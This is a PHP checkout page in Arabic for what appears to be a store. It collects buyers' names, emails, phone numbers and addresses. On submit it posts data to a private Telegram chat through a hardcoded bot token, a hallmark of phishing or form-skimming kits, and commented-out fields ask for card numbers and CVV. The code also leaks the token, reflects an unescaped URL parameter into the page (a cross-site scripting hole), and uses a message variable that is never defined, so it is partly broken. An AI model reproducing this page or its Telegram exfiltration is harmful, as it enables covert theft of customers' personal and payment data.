<?php
include 'controlPanel/Database.php';
$db = new Database();
$totalPrice = $_GET['totalPrice'];

$query = "SELECT * FROM `users` WHERE id = 2";
$result = $db->dbQuery($query);

if ($db->dbNumRows($result)) {
    $rows = $db->dbFetchResult($result);
    foreach ($rows as $row) {
        $token = $row['token'];
        $tokenID = $row['tokenID'];
    }
}

if (!isset($_SESSION["user"])) {
    header("location:index.php");
}
// $payment = $_GET['order'];
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $user = $_SESSION["user"];

    $_SESSION["name"] = $_POST['name'];
    $name = $_SESSION["name"];

    $_SESSION["email"] = $_POST['email'];
    $email = $_SESSION["email"];
    
    $_SESSION["phone"] = $_POST['phone'];
    $phone = $_SESSION["phone"];
    
    $_SESSION["country"] = $_POST['country'];
    $country = $_SESSION["country"];
    
    $_SESSION["city"] = $_POST['city'];
    $city = $_SESSION["city"];
    
    $_SESSION["location"] = $_POST['location'];
    $location = $_SESSION["location"];
    
    $_SESSION["street"] = $_POST['street'];
    $street = $_SESSION["street"];
    
    $_SESSION["home"] = $_POST['home'];
    $home = $_SESSION["home"];
    
    $_SESSION["zip"] = $_POST['zip'];
    $zip = $_SESSION["zip"];



  $apiToken = "6291664823:AAHXRzDh4U3FfagedwwVDnWRVHQ52WWKGJ0";
  $data = [
      'chat_id' => '-1002224533284',
      'text' => $databot
  ];

  $response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" .
                                 http_build_query($data) );
    header("location:pay.php?totalPrice=$totalPrice");

}
?>

<html lang="ar" dir="rtl">

<head>
    <?php include "head.php"; ?>
</head>

<body style="overflow: auto;" data-new-gr-c-s-check-loaded="14.1125.0" data-gr-ext-installed="">


    <div class="loaderk d-flex justify-content-center align-items-center" style="display: none; height: 0px;">
    </div>
    <main>
        <section class="mt-5 py-3">
        </section>
        <div class="container col-md-6 main-order" style="">
            <div class="mt-3 pb-3 border-bottom d-flex pay-header">
                <div class="store-info__logo me-3">
                    <img src="uploads/<?= $db->get_setting('web_logo')?>" class="" style="display: inline-block;" width="60" alt="">

                </div>
                <div class="">
                    <h6>مرحباً بك</h6>
                    <nav aria-label="breadcrumb">
                        <ol class="breadcrumb pt-md-0 pt-2">
                            <li class="breadcrumb-item"><a href="index.php" class="text-decoration text-black-50">الرئيسية</a></li>
                            <li class="breadcrumb-item"><a href="order.php" class="text-decoration text-black-50">سلة المشتريات</a></li>
                            <li class="breadcrumb-item active text-black" style="font-size: 14px;"  aria-current="page"><a href="" class="text-decoration-none text-black" >انهاء الطلب</a></li>
                        </ol>
                    </nav>
                </div>
            </div>
            <div class="sections-wrapper">
                <div class="d-flex justify-content-between align-items-center container  mb-3 ">
                    <!-- <i class="fas fa-circle fa-fw text-dark fa-xl opacity-75"></i> -->

                    <div class="d-flex ">
                        <span style="width: 28px;height:28px;border-radius:50%;background-color:#00a8ff;color:white;display:flex;justify-content:center;align-items:center"><i class="fa-solid fa-1 text-white"></i></span>

                    </div>
                    <span>البيانات الشخصية</span>
                    <!-- <hr class="mx-2 w-100"> -->
                </div>
                <div class="container mb-5">
                    <!--  ****************************form*****************************S -->
                    <form action="order.php?totalPrice=<?= $totalPrice ?>" method="POST" class="pb-2">

                        <div class="row">
                            <div class="col-lg-6 mb-3">
                                <span class="mb-1 d-inline-block spanlable">الاسم كاملا</span>
                                <input type="text" class="form-control" autocomplete="off" name="name" id="floatingInput" required="" placeholder="الاسم كامل">
                            </div>


                            <div class="col-lg-6 mb-3">
                                <span class="mb-1 d-inline-block spanlable">الايميل</span>
                                <input type="mail" name="email" autocomplete="off" class="form-control" required="" placeholder="الايميل">

                                <!-- <div class="form-floating mb-3">
                    <label for="cardNumber text-secondary">
                        <i class="fas fa-phone-flip fa-fw text-secondary mx-2"></i>
                        <span class="text-secondary">الايميل</span>
                    </label>
                </div> -->
                            </div>

                            <div class="col-lg-6 mb-3">
                                <span class="mb-1 d-inline-block spanlable">رقم الواتس</span>
                                <input name="phone" autocomplete="off" class="form-control" required="" placeholder="رقم الواتس">

                                <!-- <div class="form-floating mb-3">
                    <label for="cardNumber text-secondary">
                        <i class="fas fa-phone-flip fa-fw text-secondary mx-2"></i>
                        <span class="text-secondary">رقم الواتس</span>
                    </label>
                </div> -->
                            </div>













                            <!--Moo-->

                            <div class="d-flex justify-content-between  mb-3 mt-3">

                                <div class="d-flex ">
                                    <span style="width: 28px;height:28px;border-radius:50%;background-color:#00a8ff;color:white;display:flex;justify-content:center;align-items:center"><i class="fa-solid fa-2 text-white"></i></span>
                                    <img src="assets/image/icons/truck.png" class="mx-3 me-2" width="40" alt="">

                                </div>
                                <span>الشحن والتوصيل</span>
                                <!-- <hr class="mx-2 w-100"> -->
                            </div>

                            <div class="form-floating mb-10">
                                <!-- <i class="fas fa-circle fa-fw text-success fa-xl opacity-75"></i> -->
                                <!-- <img src="assets/image/icons/step-payment.svg" class="mx-3" alt=""> -->
                                <!-- <span>طريقة الدفع</span> -->
                                <!-- <hr class="mx-2" style="width: 60%;"> -->

                                <!-- <div class="row align-items-center mb-4">
                        <div class="col-6 mb-2">
                            <button class="btn btn-light py-2 border bg-white w-100 btn-lg shadow-sm">
                                <img src="assets/image/icons/mada.webp" class="w-50 mx-auto" height="50" alt="">
                            </button>
                        </div>
                        <div class="col-6 mb-2">
                            <button class="btn btn-light py-2 border bg-white w-100 btn-lg shadow-sm">
                                <img src="assets/image/icons/visa.png" class="w-50 mx-auto" height="50" alt="">
                            </button>
                        </div>
                        <div class="col-12">
                            <a href="success.php" class="btn btn-light bg-white py-2 border w-100 btn-lg shadow-sm">
                                <span class="bg-danger rounded-circle p-1">
                                    <i class="fa-solid fa-building-columns fa-fw "></i>
                                </span>
                                <h6 class="text-dark" style="font-size: 14px;">تحويل بنكي</h6>
                            </a>
                        </div>
                    </div>
                    <h3 class="my-3 text-center">
                        الدفعة المستحقة : <span class="text-danger"><?= $totalPrice ?> <?= $db->get_setting('currancy') ?></span>
                    </h3> -->
                            </div>
                        </div>












                        <div class="">
                            <div class="row ">



                                <div class="col-lg-6 mb-3">
                                    <span class="mb-1 d-inline-block spanlable">اختر الدولة</span>
                                    <input type="text" name="country" autocomplete="off" class="form-control" required="" placeholder="اختر الدولة">

                                    <!-- <div class="form-floating mb-3">
                    <label for="cardNumber text-secondary">
                        <i class="fas fa-location-dot fa-fw text-secondary mx-2"></i>
                        <span class="text-secondary">المدينة</span>
                    </label>
                    <input type="hidden" name="total_price" autocomplete="off" value="<?= $totalPrice ?>" id="total_price">
                </div> -->
                                </div>



                                <div class="col-lg-6 mb-3">
                                    <span class="mb-1 d-inline-block spanlable">ادخل المدينة</span>
                                    <input type="text" name="city" autocomplete="off" class="form-control" required="" placeholder="ادخل المدينة">
                                    <!-- 
                        <div class="form-floating mb-3">
                    <label for="cardNumber text-secondary">
                        <i class="fas fa-location-dot fa-fw text-secondary mx-2"></i>
                        <span class="text-secondary">المدينة</span>
                    </label>
                    <input type="hidden" name="total_price" autocomplete="off" value="<?= $totalPrice ?>" id="total_price">
                </div> -->
                                </div>


                                <div class="col-lg-6 mb-3">
                                    <span class="mb-1 d-inline-block spanlable">الحي</span>
                                    <input type="text" name="location" autocomplete="off" class="form-control" required="" placeholder="اسم الحي">
                                    <!-- 
                        <div class="form-floating mb-3">
                    <label for="cardNumber text-secondary">
                        <i class="fas fa-location-dot fa-fw text-secondary mx-2"></i>
                        <span class="text-secondary">المنطقة</span>
                    </label>
                    <input type="hidden" name="total_price" autocomplete="off" value="<?= $totalPrice ?>" id="total_price">
                </div> -->
                                </div>


                                <div class="col-lg-6 mb-3">
                                    <span class="mb-1 d-inline-block spanlable">الشارع</span>
                                    <input type="text" name="street" autocomplete="off" class="form-control" required="" placeholder="اسم الشارع">

                                    <!-- <div class="form-floating mb-3">
                    <label for="cardNumber text-secondary">
                        <i class="fas fa-map-pin fa-fw text-secondary mx-2"></i>
                        <span class="text-secondary">الشارع</span>
                    </label>
                    <input type="hidden" name="total_price" autocomplete="off" value="<?= $totalPrice ?>" id="total_price">
                </div>. -->
                                </div>


                             <!--   <div class="col-lg-6 mb-3">
                                    <span class="mb-1 d-inline-block spanlable">وصف البيت (اختياري)</span>
                                    <input type="text" name="home" autocomplete="off" class="form-control"  placeholder="وصف البيت">


                                </div>



                               <!-- <div class="col-lg-6 mb-3">
                                    <span class="mb-1 d-inline-block spanlable">الرمز البريدي (اختياري)</span>
                                    <input type="text" name="zip" autocomplete="off" class="form-control" placeholder="الرمز البريدي">


                                </div>



                                <!-- <div class="col-lg-6">
                    <span class="mb-1 d-inline-block"></span>
                    
                    <div class="form-floating mb-3">
                        <input type="text" class="form-control" name="CardName" id="name" autocomplete="off" required="" placeholder="الأسم الموجود على البطاقة">
                        <label for="cardname text-secondary">
                            <i class="fas fa-user fa-fw text-secondary mx-2"></i>
                            <span class="text-secondary">اسم حامل البطاقة</span>
                        </label>
                    </div>
                    </div> -->


                                <!-- <div class="col-lg-6">
                    <span class="mb-1 d-inline-block"></span>
                    <div class="form-floating mb-3">
                        <input type="tel" name="cardNumber" class="form-control rounded" id="cardNumber" autocomplete="off" required="" placeholder="0000 0000 0000 0000" maxlength="16">
                        <label for="cardNumber text-secondary">
                            <i class="fas fa-credit-card fa-fw text-secondary mx-2"></i>
                            <span class="text-secondary">رقم البطاقة</span>
                        </label>
                    </div>

                    </div> -->
                                <!-- <div class="col-6">
                                <div class="container">

                                    <div class="row border rounded" style="overflow: hidden;">

                                        <div class="col-6 px-0 mx-0">
                                            <div class="form-floating">
                                                <input type="tel" class="form-control border-0" maxlength="2" name="month" required="" id="month" placeholder="name">
                                                <label for="floatingInput text-secondary">
                                                    <span class="text-secondary">الشهر</span>
                                                </label>
                                            </div>
                                        </div>
                                        <div class="col-6  px-0 mx-0">
                                            <div class="form-floating">
                                                <input type="tel" class="form-control border border-right-0 border-top-0 border-left border-bottom-0 rounded-0" maxlength="2" name="year" required="" id="year" placeholder="name">
                                                <label for="year text-secondary">
                                                    <span class="text-secondary">السنة</span>
                                                </label>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                            <div class="col-6">
                                <div class="form-floating mb-3">
                                    <input type="tel" class="form-control" maxlength="3" name="cvc" required="" id="cvc" placeholder="name">
                                    <label for="cvc text-secondary">
                                        <span class="text-secondary">رمز التحقق (CVV)</span>
                                    </label>
                                </div>
                            </div> -->
                            </div>
                        </div>
                        <!-- <div class="container text-secondary mb-4">

                        <p style="font-size: 14px;">
                            <span class="text-success">
                                تسوق إلكتروني آمن 100%</span>
                            <i class="fab fa-cc-amazon-pay fa-fw mx-1"></i>
                            <i class="fab fa-cc-apple-pay fa-fw"></i>
                            <i class="fas fa-shield fa-fw mx-1"></i>
                        </p>
                    </div> -->

                        <!--Moo-->


                        <div class="mb-3 d-none">
                            <label class="mb-3 mx-1">طريقة الدفع</label>
                            <div class="row px-3">
                                <div class="form-check col-4">
                                    <input class="form-check-input mt-3" type="radio" value="visa" checked="" name="paymentWay" id="flexRadioDefault1">
                                    <label class="form-check-label w-100 border text-center rounded py-1" for="flexRadioDefault1">
                                        <img src="assets/image/icons/mada.webp" width="45" height="45" class="mx-1" alt="">
                                    </label>
                                </div>
                                <div class="form-check col-4">
                                    <input class="form-check-input mt-3" type="radio" value="visa" name="paymentWay" id="flexRadioDefault3">
                                    <label class="form-check-label w-100 border text-center rounded py-1" for="flexRadioDefault3">
                                        <img src="assets/image/icons/visa.png" width="" height="45" class="mx-1" alt="">
                                    </label>
                                </div>
                                <div class="form-check col-4">
                                    <input class="form-check-input mt-3" type="radio" value="direct" name="paymentWay" id="flexRadioDefault2">
                                    <label class="form-check-label w-100 border text-center rounded py-2" for="flexRadioDefault2">
                                        <img src="assets/image/icons/trans.png" width="35" class="mx-1" alt="">
                                    </label>
                                </div>
                            </div>
                        </div>

                        <!-- <div class="container">
                    <div class="container mb-3 form-check form-switch">
                        <input class="form-check-input" type="checkbox" id="taqseet">
                        <label class="form-check-label" for="taqseet">هل تريد تقسيط الجهاز دفعة مقدمة {<span class="text-danger">1000 <?= $db->get_setting('currancy') ?></span>}</label>
                    </div>
                </div> -->




                        <!-- <div id="taqsetBox" class="d-none">
                    <h4 class="mb-3 text-center">اختار مدة التقسيط ليتم الإحتساب</h4>
                    <div class="">
                        <label class="text-secondary mb-2 mx-1">الدفعة المقدمة</label>
                        <div class="form-floating mb-3">
                            <input type="hidden" name="total_price" autocomplete="off" value="<?= $totalPrice ?>" id="total_price">
                            <select class="form-select form-select-lg mb-3 rounded py-3" id="payment" name="payment" aria-label=".form-select-lg example" style="font-size: 17px;" maxlength="4">
                                <option value="<?= $totalPrice ?>" selected="" disabled="">اختر الدفعة الاولى</option>
                                <option value="1000" selected="">1000 <?= $db->get_setting('currancy') ?></option>
                                <option value="1500">1500 <?= $db->get_setting('currancy') ?></option>
                                <option value="2000">2000 <?= $db->get_setting('currancy') ?></option>
                            </select>
                        </div>
                    </div>

                    <div class="">
                        <label class="text-secondary mb-2 mx-1">مدة الأقساط</label>
                        <div class="mb-3">
                            <select class="form-select form-select-lg mb-3 rounded py-3" id="monthes" name="first_batch" aria-label=".form-select-lg example" style="font-size: 17px;">
                                <option value="1" selected="" disabled="">اختر مدة الاقساط</option>
                                <option value="3">3 اشهر</option>
                                <option value="6">6 اشهر</option>
                                <option value="12">12 شهر</option>
                                <option value="24">24 شهر</option>
                            </select>
                        </div>
                    </div>
                    <div class="">
                        <label class="text-secondary mb-2 mx-1">القسط الشهري</label>
                        <div class="form-floating mb-3">
                            <input type="text" class="form-control rounded" autocomplete="off" name="floatingInput" id="floatingInput" disabled="" placeholder="name@example.com">
                            <label for="floatingInput" id="qest">SAR Infinity</label>
                        </div>
                    </div>
                </div> -->



                        <div class="container">
                            <div class="container mb-3 form-check form-switch" style="padding-right: 1.5rem !important;">
                                <input class="form-check-input me-2" type="checkbox" id="another">
                                <label class="form-check-label" for="another" style="font-size: 15px;" >استلام الطلب عبر شخص اخر؟</label>
                            </div>
                        </div>


                        <div id="anotherBox" class="d-none">
                            <h6 class="mb-3">اضف بيانات التواصل مع المستلم</h6>

                            <div class="row">


                                <div class="col-lg-6 mb-3">
                                    <span class="mb-1 d-inline-block">اسم المستلم</span>
                                    <input type="text" class="form-control" autocomplete="off" name="nameRecipe" id="floatingInput" placeholder="اسم المستلم">
                                </div>


                                <div class="col-lg-6 mb-3">
                                    <span class="mb-1 d-inline-block">رقم الجوال</span>
                                    <input type="tel" name="phoneNum" autocomplete="off" class="form-control"  placeholder="+964 12 548 9852">

                                </div>


                                <div class="col-lg-6 mb-3">
                                    <span class="mb-1 d-inline-block">البريد الالكتروني (اختياري)</span>
                                    <input type="text" class="form-control" autocomplete="off" name="mailRecipe" id="floatingInput"  placeholder="">
                                </div>




                            </div>

                        </div>








                        <div class="form-check mx-3 mb-3">
                            <input class="form-check-input " type="checkbox" required="" value="" id="flexCheckChecked">
                            <label class="form-check-label" style="font-size: 15px;" for="flexCheckChecked">
                                - أقر بالموافقة على سياسه الاستبدال والاسترجاع وآلية الضمان
                                </br>
                                - أقر بالموافقة على استلام الطلب في حاله الدفع عند الاستلام واكون مسؤول عن الأضرار الناتج عن عدم الاستلام </label>

                            <a href="" class="text-decoration-none" style="font-size: 14px;"> رابط شروط الاستبدال والاسترجاع </a>
                            </br>
                            <a href="" class="text-decoration-none" style="font-size: 14px;">رابط آلية الضمان</a>

                        </div>


                        <div class="">
                            <button type="submit" name="confirm" id="CardBtn" class="btn btn-dark w-100">
                                <span>إكمال الدفع</span>
                                <!-- <i class="fa-solid fa-angle-left fa-fade fa-fw"></i> -->
                            </button>
                        </div>

                        <div class="container text-secondary mt-2 mb-4">

                            <p style="font-size: 14px;">تسوق إلكتروني آمن 100%
                                <i class="fab fa-cc-amazon-pay fa-fw mx-1"></i>
                                <i class="fab fa-cc-apple-pay fa-fw"></i>
                                <i class="fas fa-shield fa-fw mx-1"></i>
                            </p>
                        </div>
                    </form>
                </div>
            </div>
        </div>
        </div>
        <a href="https://wa.me/<?= $db->get_setting('whatsapp') ?>" class="contact py-2 px-3 bg-success rounded-circle">
            <i class="fab fa-whatsapp text-white my-1 fa-2x"></i>
        </a>
    </main>
    <?php
    include "script.php";
    ?>

</body>

</html>